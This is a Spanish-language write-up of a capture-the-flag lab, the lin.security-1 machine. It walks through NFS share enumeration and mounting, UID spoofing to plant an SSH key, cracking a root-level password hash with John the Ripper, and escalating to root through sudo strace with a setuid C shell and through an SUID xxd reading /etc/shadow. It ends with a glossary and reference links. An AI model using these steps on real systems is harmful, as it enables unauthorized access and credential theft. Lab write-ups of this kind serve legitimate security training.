# Machine lin.security-1

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -sV -sC 192.168.0.22
``` 
2. El resultado es el siguiente:

```
PORT       STATE  SERVICE   VERSION 
22/tcp     open   ssh       OpenSSH 7.6p1 Ubuntu 4
111/tcp    open   rpcbind   2-4 (RPC #100000)
2049/tcp   open   nfs_acl   3 (RPC #100227)

``` 

## Analisis de vulnerabilidades

Voy a nessus a realizar un escaner y luego veo que tiene una vulnerabilidad critica y es esta:

**Critical ->** NFS Exported Share Information Disclosure

**Description:** At least one of the NFS shares exported by the remote server could be mounted by the scanning host. An attacker may be able to leverage this to read (and possibly write) files on remote host.

## Exploiting

1. primero investigo algunos comandos de nfs y veo un comando interesante de nombre "showmount"
Ese comando "showmount" tiene una estructura interesante y esta:
```
$ showmount [ -ade ] [ host ]
```
2. El comando "showmount" tiene esta descripción de cada opcion:
```
-a
Imprime una lista de todos los montajes remotos. Cada entrada incluye el nombre de cliente y el directorio.
-d
Imprime una lista de los directorios montados de forma remota por los clientes. 
-e
Imprime una lista de los archivos compartidos o exportados.
```
3. entonces pruebo con cada uno de esta manera:
```
$ showmount -a 192.168.0.22 -> “All mount points on 192.168.0.22:”
$ showmount -d 192.168.0.22 -> “Directories on 192.168.0.22:”
```
4. Pero el unico que arrojo un resultado interesante es la opcion "-e"
```
$ showmount -e 192.168.0.22 -> Export list for 192.168.0.22: /home/peter *
```
5. luego voy a montar ese directorio de esta manera:
```
$ mount -t nfs 192.168.0.22:/home/peter linsec
o
$ mount -t nfs 192.168.0.22:/home/peter linsec -o nolock
```
6. pero antes en la carpeta de “/home” creamos una carpeta de nombre "linsec"
7. Luego le cambio el UID a mi usuario mrandrew por el UID 1001, esto es con el fin de que investigue en google y el UID de la maquina victima tiene que ser igual al usuario que tengo en mi maquina de Kali con el fin de que las llaves ssh tengan compatibilidad y es de esta manera:
```
$ usermod -u 1001 mrandrew
```   
8. Una vez cambiado el UID ingreso a mi usuario mrandrew y creo una llave ssh así:
```
$ ssh-keygen -t rsa -b 2048
```
9. luego entro a la carpeta “/root/linsec” y creo una carpeta de nombre “.ssh”
10. Ahora solo me queda copiar esa clave ssh que cree en un archivo de nombre "authorized_keys" y lo pego dentro de la carpeta “.ssh” de “linsec” de esta manera:
```
$ cp /home/mrandrew/.ssh/id_rsa.pub authorized_keys
```
11. una vez copiado el archivo dentro de la ruta:
```
mrandrew@kali:/root/linsec/.ssh$
```
12. podemos ingresar por medio de ssh con el usuario "peter" así:
```
$ ssh peter@192.168.0.22
```
13. Entonces lo que hago es coger todo el contenido de “etc/passwd” y lo guardo en un archivo dentro de mi maquina kali, esto es con el obetivo de decifrar el HASH ya que hay un usuario que se llama “linsecurity” que tiene un UID y GUID como usuario "root"
14. Ahora para decifrar ese HASH usare “John de ripper” y es así:
```
$ john --wordlist=/root/rockyou.txt hashlinsec
```
15. Como resultado sale que el usuario “linsecurity” tiene la password “P@ssw0rd”
16. Entonces en la sesion “ssh” con el usuario "peter" ingreso a ese usuario de esta manera:
```
$ su linsecurity
```
17. Y ya tendria permisos root


## Segunda forma de usar John de ripper

1. Hay otra forma de usar “John de ripper” y esta:
```
$ john --format=crypt --show linsec.txt
$ john --format=crypt --show linsec
```
2. Y el resultado seria este:
```
insecurity:P@ssw0rd:0:0::/:/bin/sh
1 password hash cracked, 0 left
```

## Segunda forma de elevar privilegios

1. El usuario “peter” puede ejecutar “/usr/bin/strace”
2. Con eso podemos escribir un script para levantar privilegios y es con lenguaje C que se llame por ejemplo “root.c” y es asì:
```
#include <stdlib.h>
#include <unistd.h>

int main() {
   setuid(0);
   setgid(0);
   system("/bin/bash");
}
```
3. Luego lo debemos de compilar de esta manera:
```
$ gcc root.c -o root.out
```
4. Ahora para ejecutarlo es de esta manera:
```
$ sudo strace ./root.out 2>/dev/null
```
5. Y ya con esto ingresamos como root

## Tercera forma de elevar privilegios

1. otra forma es colocar esto:
```
$ find / -type f -user root -perm /u+s -ls 2>/dev/null | grep -v snap
```
2. Si el resultado de la intrucción del paso 1 es esto:
```
-rwsr-x--- root itservices /usr/bin/xxd
```
3. podemos estonces ejecutar esto:
```
$ xxd -p /etc/shadow | xxd -p -r
```
4. El comando del paso 3 lo anterior nos permite ver los hashes de del archivo “/etc/shadow”
5. Solo quedaria decifrarlos con “john the ripper” asì:
```
$ john --format=crypt --show hashes.txt
```

## Investigación

https://nvd.nist.gov/vuln/detail/CVE-1999-0170

https://nvd.nist.gov/vuln/detail/CVE-1999-0211

https://nvd.nist.gov/vuln/detail/CVE-1999-0554

https://www.google.com/search?client=firefox-b-e&q=que+es+nfs

https://www.youtube.com/watch?v=Q-v3JifGo4U

https://blog.christophetd.fr/write-up-vulnix/

https://docs.oracle.com/cd/E24842_01/html/E22524/rfsrefer-13.html

https://docs.oracle.com/cd/E56339_01/html/E53865/gnilj.html

http://fraterneo.blogspot.com/2014/06/permitir-nfs-a-traves-de-iptables.html

https://vuldb.com/es/?id.2949

https://www.google.com/search?client=firefox-b-e&q=que+es+rpcbind

https://www.linuxito.com/nix/591-como-se-relacionan-nfsd-nfsuserd-mountd-y-rpcbind

http://linux.dokry.com/qu-hace-exactamente-rpcbind.html

https://laseguridad.online/questions/7218/riesgo-de-seguridad-de-abrir-el-puerto-111-rpcbind

https://linux.die.net/man/8/rpcbind

https://www.ediciones-eni.com/open/mediabook.aspx?idR=2526abba8f17ae4bfa14e90e3e445a00

https://codingornot.com/que-es-rpc-llamada-a-procedimiento-remoto

http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html

https://resources.infosecinstitute.com/exploiting-nfs-share/#gref

https://shieldnow.co/2018/02/15/nfs-exported-share-information-disclosure/


## Glosario de palabras

**Nfs:** El sistema de archivos de red (Network File System, NFS) es una aplicación cliente/servidor que permite a un usuario de equipo ver y, opcionalmente, almacenar y actualizar archivos en un equipo remoto como si estuvieran en el propio equipo del usuario. El protocolo NFS es uno de varios estándares de sistema de archivos distribuidos para almacenamiento atado a la red (NAS).

NFS permite al usuario o administrador del sistema montar (designar como accesible) todo o una porción de un sistema de archivos en un servidor. La parte del sistema de archivos que se monta puede ser accedida por los clientes con los privilegios que se asignan a cada archivo (de sólo lectura o de lectura y escritura). NFS utiliza llamadas de procedimiento remoto (RPC) para enrutar solicitudes entre clientes y servidores.

NFS fue originalmente desarrollado por Sun Microsystems en la década de 1980 y ahora es administrado por el Internet Engineering Task Force (IETF). La versión NFSv4.1 (RFC-5661) fue ratificada en enero de 2010 para mejorar la escalabilidad, añadiendo soporte para el acceso paralelo a través de servidores distribuidos. Las versiones 2 y 3 del sistema de archivos de red permiten que el protocolo UDP (User Datagram Protocol) que se ejecuta sobre una red IP proporcione conexiones de red sin estado entre clientes y servidor, pero NFSv4 requiere el uso del protocolo de control de transmisión (TCP).

**rpcbind:** se usa para enumerar servicios activos y para indicar al cliente solicitante a dónde enviar la solicitud RPC. Si un host escucha en el puerto 111, se puede usar rpcinfo para obtener la ejecución de los números de programa, puertos y servicios y para su uso de buscar informacion es asì:
```
$ rpcinfo -p x.x.x.x
```
mostrar la informacion de rpcbind Si expone este servicio a Internet, todos pueden consultar esta información sin tener que autenticarse. Puede ser útil para los atacantes saber qué está ejecutando.

**RPC:** Llamada a procedimiento remoto o RPC por sus siglas en inglés (Remote Procedure Call) es una técnica que utiliza el modelo cliente-servidor para ejecutar tareas en un proceso diferente como podría ser en una computadora remota. A veces solamente se le llama como llamada a una función o subrutina remota.


## Explotación maquina

https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb

https://blog.christophetd.fr/write-up-vulnix/

## Explotación maquina

https://www.youtube.com/watch?v=ObmGG-RO9yg

## Explotación lin.security

https://hackso.me/lin.security-1-walkthrough/

https://wjmccann.github.io/blog/2018/08/14/LinSecurity-Walkthrough

## Uso de "/usr/bin/strace"

https://www.it-swarm.dev/es/linux/como-se-debe-usar-strace/958381454/

https://blog.cpanel.com/starting-with-strace/

https://www.redpill-linpro.com/sysadvent/2015/12/10/introduction-to-strace.html

https://stackoverflow.com/questions/174942/how-should-strace-be-used

https://www.thegeekstuff.com/2011/11/strace-examples/
